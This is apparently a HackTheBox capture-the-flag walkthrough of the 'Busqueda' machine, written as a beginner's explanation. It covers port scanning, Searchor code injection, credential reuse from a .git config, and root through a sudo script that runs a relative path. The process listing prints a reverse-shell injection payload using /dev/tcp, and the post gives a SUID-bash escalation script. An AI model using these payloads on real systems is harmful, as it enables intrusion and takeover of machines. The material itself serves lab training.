---
title: "HTB Busqueda Machine Writeup"
date: 2023-06-18T08:21:17-04:00
author: "D4rkNebula"
ShowReadingTime: true
comments: false
description: "Walkthrough for Busqueda (easy linux machine) in HackTheBox"
searchHidden: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
Icon: htb.svg
---

<center>
![Busqueda](./images/Busqueda.png)
</center>

When I started getting into cybersecurity and htb I had no idea where to begin, What to do and why enter commands that I found. So in this writeup as it's an easy machine i'll try to write a short part for each command to explain what does the command do, how did I figured out I should use this command, etc. So without any further waste of time lets get to it.

## User Access

### Recon
First step is obviously finding something to work on. It could be a web service, could be a open ftp, could be anything. So our first step is to run a port scan to find out which ports are open and work on them.
```bash
┌──(d4rknebula㉿ur-home)-[~]
└─$ rustscan -a 10.10.11.208 -r 0-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/d4rknebula/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.208:22
Open 10.10.11.208:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 09:57 EDT
Initiating Ping Scan at 09:57
Scanning 10.10.11.208 [2 ports]
Completed Ping Scan at 09:57, 0.27s elapsed (1 total hosts)
Initiating Connect Scan at 09:57
Scanning searcher.htb (10.10.11.208) [2 ports]
Discovered open port 22/tcp on 10.10.11.208
Discovered open port 80/tcp on 10.10.11.208
Completed Connect Scan at 09:57, 0.26s elapsed (2 total ports)
Nmap scan report for searcher.htb (10.10.11.208)
Host is up, received syn-ack (0.26s latency).
Scanned at 2023-06-18 09:57:17 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```
I use [rustscan](https://github.com/RustScan/RustScan) instead of nmap because it's so much faster and when it find the ports then it passes the ports to nmap for a completer scan on only those port.

Anyway the output of port scan shows us that there is two ports open, 22 which is the ssh port and usually we don't have to do anything with it in htb. And the 80 which is a web server so lets take a look at it.
```bash
┌──(d4rknebula㉿ur-home)-[~]
└─$ curl -vvv 10.10.11.208
*   Trying 10.10.11.208:80...
* Connected to 10.10.11.208 (10.10.11.208) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.208
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sun, 18 Jun 2023 14:09:32 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Location: http://searcher.htb/
< Content-Length: 282
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://searcher.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.208 Port 80</address>
</body></html>
* Connection #0 to host 10.10.11.208 left intact
```
So it uses a domain name. Lets add it to our /etc/hosts file so we can take a look at the website.(add `10.10.11.208	searcher.htb` to your hosts file)

And opening it in our browse, We'll see a website
![Busqueda Web](./images/busqueda-web.png)

It's just a website that adds our input to the link for searching of those platforms. 
### Initial access
I've found the vulnerability in the program myself but after finishing the box when I was reviewing it I found out that there was `Powered by Flask and Searchor 2.4.0` at the end of the website. searching for it's vulnerabilities gives us poc for code injection.
![Init Access](./images/busqueda-init-access.png "Initial Access")
Using a reverse shell we'll be able to get our initial access to the machine and we can get the user flag at `/home/svc/user.txt`.

## Root Access

### Recon
Again, we need to find something and then use it or exploit it.

Lets see what users exists.
```bash
bash-5.1$ cat /etc/passwd | egrep -v "(nologin|false|sync)"
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
```
the egrep command removes the users that are system users or service users or etc that we don't need from output.

looks like it's only the user that we are currently and the root user.

lets see what files are in the user home directory.
```bash
bash-5.1$ ls -lah
drwxr-x--- 8 svc  svc  4.0K Jun 18 14:57 .
drwxr-xr-x 3 root root 4.0K Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3.7K Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4.0K Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc   109 Jun 18 13:27 .gitconfig
drwx------ 3 svc  svc  4.0K Jun 18 13:20 .gnupg
drwxrwxr-x 5 svc  svc  4.0K Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 3 svc  svc  4.0K Jun 18 13:13 snap
drwxr-xr-x 2 svc  svc  4.0K Jun 18 14:11 .ssh
-rw-r----- 1 root svc    33 Jun 18 13:05 user.txt
bash-5.1$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Interesting. Lets keep searching. Cheking hosts file we'll find a `gitea` subdomain, add it to our hosts file in attacker machine and there is a gitea running on the subdomain, searching through that we'll find two users and nothing more. `cody` which looks like it's the user we have access and `administrator`.

Next I checked the services running
```bash
bash-5.1$ ps -aux
svc         1719  0.0  0.9 261144 19816 ?        Ssl  13:05   0:03 python3 /var/www/app/app.py
svc        36488  0.0  0.8  23872 16144 ?        S    15:10   0:00 /usr/bin/python3 /usr/local/bin/searchor search Accuweather '+str(__import__('os').system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"'))+'
svc        36489  0.0  0.0   2888  1000 ?        S    15:10   0:00 sh -c bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
svc        36617  0.0  0.1  10332  3840 ?        R    15:44   0:00 ps -aux
```
lets check the python app that we got our initial access exploiting it.
```bash
bash-5.1$ ls -lah 
total 20K
drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4.0K Jun 18 13:05 .git
drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
```

checking inside `.git` folder and we'll find credential for the user `cody` in config file.
```bash
bash-5.1$ cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Using this password we can log into gitea but it's just source of the searcher site and nothing more. But as the cody .gitconfig was in the user home directory I thought it might be the users password too and I was right.

So first thing to do for priv-esc that wasn't possible before is
```bash
bash-5.1$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.1$ sudo -l 
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
And yesss there is a command to run as root🥳 but let's not count chickens before they hatch and see what does the command do.

```bash
bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
Ok I'll admit it I got excited too soon there still a couple of things to do.

Well the full-checkup gives `Something went wrong`, docker-ps shows there is two container running and doesn't use the arguments provided.

Last but not least docker-inspect the most interesting one.
```bash
bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```
After reading about format in docker-inspect manual I thought I might be able to get a shell somehow using an command injection but I couldn't do that so dove more into documentation and started reading every config that docker-inspect gave me using the format "{{json .}}" and **BINGO**.
![docker-inspect-creds](./images/busqueda-docker.png "Creds in docker-inspect")
It's database credentials and we can log into mysql using `mysql -u gitea -h 127.0.0.1 -p` but even though the hash of administrator is in there but it's not crackable. As the way the user cody password found I tried the same password on administrator account and it worked.

There is another private repository in administrator account which is the scripts in /opt folder and the source of the script that we can run using sudo. Let's see what are we running.
![Source of sudo script](./images/busqueda-source.png "Source code of sudo script")
Can you see where is the vulnerability and why we kept getting `something went wrong` when trying `full-checkup`? Because of `./full-checkup.sh` running the sudo command in `/opt/scripts` will do as it should but in `/tmp` with our malicious script? It'll give us root access.
```bash
#!/bin/bash
cp /bin/bash /tmp
chmod +s /tmp/bash
```
this script will copy bash in tmp and add suid permission to it and we can get root using `/tmp/bash -p` and get root flag ;)
![Root Access](./images/busqueda-root.png "Root Access")

# Authors

> Written by [D4rkNebula](https://github.com/D4rkNebula)